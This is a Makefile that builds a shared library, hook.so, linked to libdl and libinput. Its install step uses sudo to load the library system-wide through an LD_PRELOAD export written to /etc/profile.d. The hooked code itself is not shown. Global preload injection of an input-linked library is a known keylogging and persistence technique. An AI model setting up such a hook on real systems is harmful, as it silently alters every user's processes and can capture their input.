CC = gcc
CFLAGS = -shared -fPIC -ldl -linput
TARGET = hook.so
INSTALL_DIR = /usr/local/lib
HOOK_PATH = $(INSTALL_DIR)/$(TARGET)
PROFILE_D = /etc/profile.d/hook.sh

all: $(TARGET)

$(TARGET): hook.c
	$(CC) $(CFLAGS) hook.c -o $(TARGET)

install: $(TARGET)
	@echo "Installing $(TARGET) to $(INSTALL_DIR)..."
	sudo mkdir -p $(INSTALL_DIR)
	sudo cp $(TARGET) $(HOOK_PATH)
	@echo "Creating /etc/profile.d hook script..."
	echo "export LD_PRELOAD=$(HOOK_PATH)" | sudo tee $(PROFILE_D)
	sudo chmod +x $(PROFILE_D)
	@echo "Done. Logout/login to apply globally."

clean:
	rm -f $(TARGET)
	sudo rm -f $(PROFILE_D)

